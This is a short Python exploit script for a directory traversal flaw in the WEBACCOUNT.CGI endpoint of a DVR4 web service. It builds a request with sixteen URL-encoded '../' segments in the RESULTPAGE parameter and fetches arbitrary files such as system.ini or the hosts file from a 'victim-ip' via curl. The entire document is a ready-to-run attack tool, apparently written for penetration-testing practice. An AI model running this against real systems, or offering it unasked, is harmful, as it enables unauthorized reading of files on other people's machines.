#!/usr/bin/env python3
"""
Directory traversal utility for DVR4 / WEBACCOUNT.CGI
Usage: python3 dirTraverse.py <victim-ip> <path>
       python3 dirTraverse.py <victim-ip>          (defaults to Windows/system.ini)

Example paths (use forward slashes; script handles encoding):
  Windows/system.ini
  Windows/win.ini
  Windows/System32/drivers/etc/hosts
"""

import subprocess
import sys
import urllib.parse

DEFAULT_PATH = "Windows/system.ini"
PORT = 8080
DEPTH = 16  # number of ../ traversal segments


def build_url(ip: str, path: str) -> str:
    # Encode each segment of the path with %2F separators
    encoded_path = "%2F".join(urllib.parse.quote(seg, safe="") for seg in path.split("/"))
    traversal = "..%2F" * DEPTH
    result_page = f"{traversal}{encoded_path}"
    return (
        f"http://{ip}:{PORT}/WEBACCOUNT.CGI"
        f"?OkBtn=++Ok++&RESULTPAGE={result_page}"
        f"&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <victim-ip> [path]")
        sys.exit(1)

    ip = sys.argv[1]
    path = sys.argv[2] if len(sys.argv) >= 3 else DEFAULT_PATH

    url = build_url(ip, path)
    print(f"[*] Target : {ip}:{PORT}")
    print(f"[*] File   : {path}")
    print(f"[*] URL    : {url}\n")

    result = subprocess.run(
        ["curl", "-s", "-g", url],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0:
        print(f"[!] curl error: {result.stderr.strip()}")
        sys.exit(result.returncode)

    output = result.stdout
    if not output.strip():
        print("[!] Empty response — file may not exist or traversal failed.")
    else:
        print(output)


if __name__ == "__main__":
    main()
